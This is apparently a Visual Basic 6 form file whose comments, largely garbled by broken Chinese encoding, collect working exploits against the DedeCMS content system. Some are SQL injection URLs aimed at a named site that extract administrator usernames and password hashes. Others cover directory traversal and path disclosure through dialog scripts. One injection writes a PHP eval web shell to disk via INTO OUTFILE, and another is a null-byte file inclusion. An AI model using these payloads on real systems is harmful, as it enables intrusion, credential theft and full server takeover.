VERSION 5.00
Begin VB.Form Form2 
   Caption         =   "Form2"
   ClientHeight    =   6630
   ClientLeft      =   120
   ClientTop       =   450
   ClientWidth     =   11910
   LinkTopic       =   "Form2"
   ScaleHeight     =   6630
   ScaleWidth      =   11910
   StartUpPosition =   3  '����ȱʡ
End
Attribute VB_Name = "Form2"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit

'��һ�����������Ե�:
'�ύkuxoo.com/plus/search.php?keyword=as&typeArr[ uNion ]=a
'
'����������ʾ:
'Safe Alert: Request Error step 2 !
'��ôֱ���������Exp:
'kuxoo.com/plus/search.php?keyword=as&typeArr[111%3D@`\'`)+UnIon+seleCt+1,2,3,4,5,6,7,8,9,10,userid,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,pwd,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42+from+`%23@__admin`%23@`\'`+]=a
'����������ʾ:
'Safe Alert: Request Error step 1 !
'��ôֱ���������Exp:
'kuxoo.com/plus/search.php?keyword=as&typeArr[111%3D@`\'`)+and+(SELECT+1+FROM+(select+count(*),concat(floor(rand(0)*2),(substring((select+CONCAT(0x7c,userid,0x7c,pwd)+from+`%23@__admin`+limit+0,1),1,62)))a+from+information_schema.tables+group+by+a)b)%23@`\'`+]=a
'Examples:
'http://kuxoo.com//plus/search.php?keyword=as&typeArr[111%3D@`\'`)+UnIon+seleCt+1,2,3,4,5,6,7,8,9,10,11,userid,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42+from+`%23@__admin`%23@`\'`+]=a
'http://kuxoo.com//plus/search.php?keyword=as&typeArr[111%3D@`\'`)+UnIon+seleCt+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42+from+`%23@__admin`%23@`\'`+]=a
'
'���������ʾ֤��©���������ˡ� 20λ������,ȥ��ǰ3λ�����һλ�����ˣ�

'
'1.include/dialog/select_soft.php�ļ����Ա���dedecms�ĺ�̨,��ǰ���ϰ汾����������½��ֱ֤�ӷ���,�������Ա�ʺ�,�°汾�ľ�ֱ��ת���˺�̨.
'2.include/dialog/config.php�ᱬ����̨����·��
'3.include/dialog/select_soft.php?activepath=/include/FCKeditor ��תĿ¼
'4.include/dialog/select_soft.php?activepath=/st0pst0pst0pst0pst0pst0pst0pst0p ������վ����·��.
'5.����һЩ�Ͱ汾��DEDECMS�������ҳ���ʱ���ֱ��������½��֤,ֱ����ʾ,���һ�������/././././././././��
'����Ŀ¼ȥ.������Щ�汾�ķ��ʵ�ַ��Щ��ͬ.
'��ַΪrequire/dialog/select_soft.php?activepath=/././././././././
'include\dialog\Ŀ¼�µ����⼸���ļ�������ͬһ������,ֻ��Ĭ�����Ŀ¼��ͬ.��Щ���Բ鿴HTML��Щ�ļ�Ŷ..
'������ͬ������ļ�����
'include\dialog\select_images.php
'include\dialog\select_media.php
'include\dialog\select_templets.php




'plus/carbuyaction.php?dopost=return&dsql=and 1=2 union select 1,0x3C3F70687020406576616C28245F504F53545B2763275D293B3F3E,3,..n into outfile '1.php'
'plus/carbuyaction.php?dopost=return&dsql=xx


'plus/carbuyaction.php?dopost=return&code=../../uploads/userup/xx/myface.gif%00



'http://www.xxx.com/plus/carbuyaction.php?dopost=return&code=../../
'��cookie �м��� code=alipay




